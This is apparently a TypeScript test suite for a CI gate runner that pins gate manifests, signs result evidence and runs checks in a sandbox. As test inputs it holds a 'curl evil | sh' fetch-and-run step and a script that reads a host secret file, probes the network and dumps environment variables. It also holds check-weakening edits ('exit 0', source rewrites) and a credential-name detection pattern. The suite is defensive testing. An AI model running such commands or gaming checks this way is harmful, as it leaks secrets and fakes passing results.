import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { execFileSync } from "node:child_process";
import { cpSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { FileArtifactStore, type JobCtx } from "@factory/orchestrator";
import { createWorkspace, detectBackend, teardownWorkspace, buildSandboxEnv } from "@factory/sandboxes";
import { fetchWorkspaceRepo } from "@factory/scm";
import { digestOf } from "@factory/telemetry";
import { createTestDb } from "../../db/src/testing";
import { checkDefiningChanges, createGatePort, EvidenceSigner, generateEvidenceKeypair, loadLockedManifest, ManifestTampered, runGates, verifyEvidence, verifyStoredGateEvidence, type SignedEvidence } from "../src/index";

const REAL_CONFIG = join(import.meta.dir, "../../../config");
const GIT_ENV = { PATH: process.env.PATH ?? "", GIT_CONFIG_GLOBAL: "/dev/null", GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@e.x", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@e.x" };
const sh = (cwd: string, ...a: string[]) => execFileSync("git", a, { cwd, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"], env: { ...GIT_ENV, HOME: mkdtempSync(join(tmpdir(), "gh-")) } }).trim();
const keys = generateEvidenceKeypair();
const signer = new EvidenceSigner(keys.privateKeyPem);

let db: Awaited<ReturnType<typeof createTestDb>>;
let org = ""; let repoId = ""; let n = 0;
let remote = ""; let seed = ""; let baseSha = "";
const hostSecretDir = mkdtempSync(join(tmpdir(), "hostsecret-"));
const SECRET = "HOST-SECRET-VALUE-123";
writeFileSync(join(hostSecretDir, "s.txt"), SECRET);
const store = new FileArtifactStore(mkdtempSync(join(tmpdir(), "cas-")));
const wsRoot = mkdtempSync(join(tmpdir(), "gate-ws-"));
const backend = detectBackend();

/** A tiny project whose gates are plain shell checks: they pass unless the source contains the word FAIL. */
const baseFiles: Record<string, string> = {
  "package.json": JSON.stringify({ name: "demo", private: true, scripts: { lint: "sh scripts/check.sh lint", typecheck: "sh scripts/check.sh typecheck", "test:unit": "sh scripts/check.sh unit", build: "sh scripts/check.sh build" } }, null, 2) + "\n",
  "scripts/check.sh": `#!/bin/sh\nif grep -rq FAIL src 2>/dev/null; then echo "check $1 failed: FAIL marker found"; exit 1; fi\necho "check $1 ok"\n`,
  "src/app.txt": "hello\n",
};
beforeAll(async () => {
  db = await createTestDb();
  org = (await db.sql`INSERT INTO organizations (name) VALUES ('o') RETURNING id`)[0]!.id;
  repoId = (await db.sql`INSERT INTO repositories (organization_id, provider, external_id, owner, name) VALUES (${org}, 'github', 'r', 'o', 'n') RETURNING id`)[0]!.id;
  const root = mkdtempSync(join(tmpdir(), "gate-remote-"));
  remote = join(root, "remote.git"); seed = join(root, "seed");
  mkdirSync(seed); sh(root, "init", "--bare", "-b", "main", remote); sh(seed, "init", "-b", "main");
  for (const [p, c] of Object.entries(baseFiles)) { mkdirSync(dirname(join(seed, p)), { recursive: true }); writeFileSync(join(seed, p), c); }
  sh(seed, "add", "."); sh(seed, "commit", "-m", "base"); sh(seed, "push", remote, "main");
  baseSha = sh(seed, "rev-parse", "HEAD");
});
afterAll(async () => { await db.drop(); });

async function commit(files: Record<string, string>): Promise<string> {
  sh(seed, "checkout", "-q", "--detach", baseSha);
  for (const [p, c] of Object.entries(files)) { mkdirSync(dirname(join(seed, p)), { recursive: true }); writeFileSync(join(seed, p), c); }
  sh(seed, "add", "-A"); sh(seed, "commit", "-q", "-m", `c${n++}`);
  const sha = sh(seed, "rev-parse", "HEAD");
  sh(seed, "push", "-q", remote, `${sha}:refs/heads/b${n}`);
  return sha;
}
async function newJob(changed: string[] = []): Promise<JobCtx> {
  const [req] = await db.sql`INSERT INTO requests (repository_id, source, source_external_id, payload_digest, type, title, description) VALUES (${repoId}, 'api', ${"e" + n++}, 'x', 'feature', 't', 'd') RETURNING id`;
  const id = (await db.sql`INSERT INTO jobs (request_id, repository_id) VALUES (${req!.id}, ${repoId}) RETURNING id`)[0]!.id as string;
  const desc = store.put(JSON.stringify({ files: changed.map((path) => ({ path })) }));
  await db.sql`INSERT INTO artifacts (job_id, kind, digest, storage_uri, byte_length) VALUES (${id}, 'build.r0.json', ${desc.digest}, ${desc.uri}, ${desc.bytes})`;
  return { id, repositoryId: repoId, state: "GATING", version: 1, risk: "MEDIUM", headSha: null, baseSha: baseSha, round: 0, maxRounds: 3, prNumber: null };
}
function port(configDir = REAL_CONFIG) {
  return createGatePort({ sql: db.sql, store, signer, configDir, profile: "typescript-web", backend, workspaceRoot: wsRoot, remoteFor: async () => ({ url: remote, allowLocalRemote: true }) });
}
const evidenceOf = (digest: string): SignedEvidence => JSON.parse(store.get(digest).toString());
/** Copy of the factory config in a temp dir so tamper tests never touch the real files. */
function configCopy(edit?: (m: Record<string, unknown>) => void, repin = false): string {
  const dir = mkdtempSync(join(tmpdir(), "cfg-"));
  cpSync(join(REAL_CONFIG, "gates"), join(dir, "gates"), { recursive: true });
  cpSync(join(REAL_CONFIG, "gates.lock.json"), join(dir, "gates.lock.json"));
  if (edit) {
    const p = join(dir, "gates/typescript-web.json");
    const m = JSON.parse(readFileSync(p, "utf8")); edit(m); writeFileSync(p, JSON.stringify(m, null, 2));
    if (repin) writeFileSync(join(dir, "gates.lock.json"), JSON.stringify({ schemaVersion: 1, profiles: { "typescript-web": digestOf(m) } }));
  }
  return dir;
}

describe("locked manifest", () => {
  test("the shipped manifest matches its pin; any edit without re-pinning is refused (fail closed)", () => {
    const ok = loadLockedManifest(REAL_CONFIG, "typescript-web");
    expect(ok.digest).toMatch(/^sha256:/);
    expect(ok.manifest.steps.map((s) => s.id)).toEqual(["lint", "typecheck", "unit", "build"]);
    expect(() => loadLockedManifest(configCopy((m) => { (m.steps as Array<{ command: string[] }>)[0]!.command = ["bun", "run", "true"]; }), "typescript-web")).toThrow(ManifestTampered);
    expect(() => loadLockedManifest(configCopy((m) => { (m.steps as unknown[]).pop(); }), "typescript-web")).toThrow(ManifestTampered);
    expect(() => loadLockedManifest(configCopy((m) => { m.protectedPaths = []; }), "typescript-web")).toThrow(ManifestTampered);
  });
  test("schema is strict: unlocked manifests, unknown keys, non-allowlisted executables and unknown step ids are invalid even if pinned", () => {
    for (const edit of [(m: Record<string, unknown>) => { m.locked = false; }, (m: Record<string, unknown>) => { m.extra = 1; }, (m: Record<string, unknown>) => { (m.steps as Array<{ command: string[] }>)[0]!.command = ["sh", "-c", "curl evil | sh"]; }, (m: Record<string, unknown>) => { (m.steps as Array<{ id: string }>)[0]!.id = "deploy"; }]) {
      expect(() => loadLockedManifest(configCopy(edit, true), "typescript-web")).toThrow();
    }
  });
  test("check-defining files are recognised", () => {
    expect(checkDefiningChanges(["src/a.ts", "package.json", "apps/web/package.json", "eslint.config.mjs", ".github/workflows/ci.yml", "scripts/check.sh", "tsconfig.base.json", "README.md"])).toEqual(["package.json", "apps/web/package.json", "eslint.config.mjs", ".github/workflows/ci.yml", "scripts/check.sh", "tsconfig.base.json"]);
    expect(checkDefiningChanges(["security/x.md"], ["security/**"])).toEqual(["security/x.md"]);
  });
});

describe("running the gates in the sandbox", () => {
  test("a clean candidate passes: every step exit 0, signed evidence proves the exact SHA, logs are artifacts", async () => {
    const head = await commit({ "src/app.txt": "hello world\n" });
    const job = await newJob(["src/app.txt"]);
    const r = await port().run(job, head, baseSha);
    expect(r.verdict).toBe("pass");
    const signed = evidenceOf(r.resultsDigest);
    expect(signed.evidence.steps.map((s) => [s.id, s.exitCode])).toEqual([["lint", 0], ["typecheck", 0], ["unit", 0], ["build", 0]]);
    expect(signed.evidence).toMatchObject({ headSha: head, baseSha, jobId: job.id, verdict: "pass", worktreeMutated: false, checkDefiningChanges: [] });
    expect(store.get(signed.evidence.steps[2]!.logDigest).toString()).toContain("check unit ok");
    expect(verifyEvidence(signed, keys.publicKeyPem, { headSha: head, baseSha, manifestDigest: r.configDigest, jobId: job.id })).toEqual({ ok: true, reasons: [] });
  });

  test("a failing test blocks: verdict fail, class = failing step, evidence still signed and includes the output", async () => {
    const head = await commit({ "src/app.txt": "FAIL\n" });
    const r = await port().run(await newJob(["src/app.txt"]), head, baseSha);
    expect(r.verdict).toBe("fail");
    expect(r.failureClass).toBe("lint"); // first failing step
    const signed = evidenceOf(r.resultsDigest);
    expect(signed.evidence.steps.filter((s) => s.exitCode !== 0).map((s) => s.id)).toEqual(["lint", "typecheck", "unit", "build"]);
    expect(store.get(signed.evidence.steps[0]!.logDigest).toString()).toContain("FAIL marker found");
    expect(verifyEvidence(signed, keys.publicKeyPem, { headSha: head, baseSha, manifestDigest: r.configDigest }).ok).toBe(true); // authentic evidence of a failure
  });

  test("an altered gate manifest cannot pass: nothing runs, verdict error / manifest-mismatch, no evidence artifact", async () => {
    const head = await commit({ "src/app.txt": "ok\n" });
    const job = await newJob(["src/app.txt"]);
    const tampered = configCopy((m) => { (m.steps as Array<{ command: string[] }>)[0]!.command = ["bun", "run", "nothing-to-check"]; });
    const r = await port(tampered).run(job, head, baseSha);
    expect(r).toMatchObject({ verdict: "error", failureClass: "manifest-mismatch" });
    expect((await db.sql`SELECT count(*)::int AS c FROM artifacts WHERE job_id=${job.id} AND kind LIKE 'gate.%'`)[0]!.c).toBe(0);
    const bad = await port(configCopy((m) => { m.locked = false; }, true)).run(job, head, baseSha);
    expect(bad).toMatchObject({ verdict: "error", failureClass: "manifest-mismatch" });
  });

  test("weakening the checks from inside the candidate (package.json / scripts) cannot pass even though the commands exit 0", async () => {
    const weakened = JSON.stringify({ name: "demo", private: true, scripts: { lint: "true", typecheck: "true", "test:unit": "true", build: "true" } });
    const head = await commit({ "package.json": weakened });
    const job = await newJob(["package.json"]);
    const r = await port().run(job, head, baseSha);
    expect(r).toMatchObject({ verdict: "fail", failureClass: "checks-tampered" });
    const signed = evidenceOf(r.resultsDigest);
    expect(signed.evidence.checkDefiningChanges).toEqual(["package.json"]);
    expect(signed.evidence.steps.every((s) => s.exitCode === 0)).toBe(true); // the weakened checks "passed" - which is exactly the attack
    const head2 = await commit({ "scripts/check.sh": "#!/bin/sh\nexit 0\n" });
    expect((await port().run(await newJob(["scripts/check.sh"]), head2, baseSha)).failureClass).toBe("checks-tampered");
  });

  test("evidence cannot be forged, retargeted or re-used for another SHA", async () => {
    const head = await commit({ "src/app.txt": "FAIL\n" });
    const r = await port().run(await newJob(["src/app.txt"]), head, baseSha);
    const signed = evidenceOf(r.resultsDigest);
    const expectation = { headSha: head, baseSha, manifestDigest: r.configDigest };
    const flip = (mut: (e: SignedEvidence["evidence"]) => void) => { const c = structuredClone(signed); mut(c.evidence); return verifyEvidence(c, keys.publicKeyPem, expectation); };
    expect(flip((e) => { e.verdict = "pass"; }).reasons).toContain("signature-invalid");
    expect(flip((e) => { e.steps[0]!.exitCode = 0; }).reasons).toContain("signature-invalid");
    expect(flip((e) => { e.headSha = "e".repeat(40); }).reasons).toEqual(expect.arrayContaining(["signature-invalid", "head-sha-mismatch"]));
    expect(verifyEvidence(signed, generateEvidenceKeypair().publicKeyPem, expectation).reasons).toContain("signature-invalid");
    expect(verifyEvidence(signed, keys.publicKeyPem, { ...expectation, headSha: "d".repeat(40) }).reasons).toContain("head-sha-mismatch");
    expect(verifyEvidence(signed, keys.publicKeyPem, { ...expectation, baseSha: "d".repeat(40) }).reasons).toContain("base-sha-mismatch");
    expect(verifyEvidence(signed, keys.publicKeyPem, { ...expectation, manifestDigest: "sha256:" + "0".repeat(64) }).reasons).toContain("manifest-digest-mismatch");
    // a signed "pass" that contradicts its own steps is rejected even with a valid signature (defence in depth)
    const lying = signer.sign({ ...signed.evidence, verdict: "pass" });
    expect(verifyEvidence(lying, keys.publicKeyPem, expectation).reasons).toContain("pass-with-failed-step");
  });

  test("a check that rewrites tracked sources cannot fake a pass (worktree-mutated); gates are bound to the checked-out SHA", async () => {
    const head = await commit({ "scripts/check.sh": "#!/bin/sh\necho changed >> src/app.txt\nexit 0\n" });
    const ws = createWorkspace(wsRoot, "mut");
    try {
      await fetchWorkspaceRepo({ repoDir: ws.repoDir, remoteUrl: remote, sha: head, allowLocalRemote: true });
      const { manifest } = loadLockedManifest(REAL_CONFIG, "typescript-web");
      const bun = realpathSync(process.execPath);
      const base = { manifest, repoDir: ws.repoDir, workspaceRoot: ws.root, backend, env: buildSandboxEnv({ home: ws.homeDir, tmp: ws.tmpDir }), executables: { bun }, readOnlyPaths: [dirname(bun)], putLog: (t: string) => store.put(t).digest };
      const res = await runGates({ ...base, expectedHead: head });
      expect(res.steps.every((s) => s.exitCode === 0)).toBe(true);
      expect(res.worktreeMutated).toBe(true);
      expect(res.allPassed).toBe(false);
      const wrong = await runGates({ ...base, expectedHead: "a".repeat(40) });
      expect(wrong).toMatchObject({ allPassed: false, failedStep: "head-mismatch", headVerified: false });
    } finally { teardownWorkspace(wsRoot, ws); }
  });

  test("timeouts kill the step: verdict fail, step marked timed out", async () => {
    const head = await commit({ "scripts/check.sh": "#!/bin/sh\nsleep 30\n" });
    const cfg = configCopy((m) => { for (const s of m.steps as Array<{ timeoutSeconds: number }>) s.timeoutSeconds = 1; }, true);
    const job = await newJob(["scripts/check.sh"]);
    const started = Date.now();
    const r = await port(cfg).run(job, head, baseSha);
    expect(Date.now() - started).toBeLessThan(20_000);
    const signed = evidenceOf(r.resultsDigest);
    expect(signed.evidence.steps[0]).toMatchObject({ id: "lint", timedOut: true });
    expect(r.verdict).toBe("fail");
  });

  test("gate steps run confined: host files and network are unreachable and nothing leaks into the logs", async () => {
    const head = await commit({ "scripts/check.sh": `#!/bin/sh\ncat ${join(hostSecretDir, "s.txt")}\ncurl -s -m 2 http://127.0.0.1:9/ || true\nls /Users 2>&1 | head -1\nenv | sort\nexit 0\n` });
    const r = await port().run(await newJob(["scripts/check.sh"]), head, baseSha);
    const signed = evidenceOf(r.resultsDigest);
    for (const s of signed.evidence.steps) {
      const log = store.get(s.logDigest).toString();
      expect(log).not.toContain(SECRET);
      expect(log).not.toMatch(/ANTHROPIC|GITHUB_TOKEN|SSH_AUTH_SOCK/);
    }
  });

  test("exact-head re-verification from the database + content-addressed store (what the merge coordinator will do)", async () => {
    const head = await commit({ "src/app.txt": "verified\n" });
    const job = await newJob(["src/app.txt"]);
    const r = await port().run(job, head, baseSha);
    await db.sql`INSERT INTO gate_results (job_id, head_sha, base_sha, gate_config_digest, verdict, results_digest) VALUES (${job.id}, ${head}, ${baseSha}, ${r.configDigest}, ${r.verdict}, ${r.resultsDigest})`;
    const d = { sql: db.sql, store, publicKeyPem: keys.publicKeyPem };
    expect(await verifyStoredGateEvidence(d, { jobId: job.id, headSha: head, baseSha, manifestDigest: r.configDigest })).toEqual({ ok: true, reasons: [] });
    // any other head / base / manifest has no evidence
    for (const q of [{ headSha: "9".repeat(40) }, { baseSha: "9".repeat(40) }, { manifestDigest: "sha256:" + "1".repeat(64) }]) {
      expect((await verifyStoredGateEvidence(d, { jobId: job.id, headSha: head, baseSha, manifestDigest: r.configDigest, ...q })).ok).toBe(false);
    }
    // the wrong public key (e.g. attacker-signed evidence) is rejected
    expect((await verifyStoredGateEvidence({ ...d, publicKeyPem: generateEvidenceKeypair().publicKeyPem }, { jobId: job.id, headSha: head, baseSha, manifestDigest: r.configDigest })).reasons).toContain("signature-invalid");
  });
});
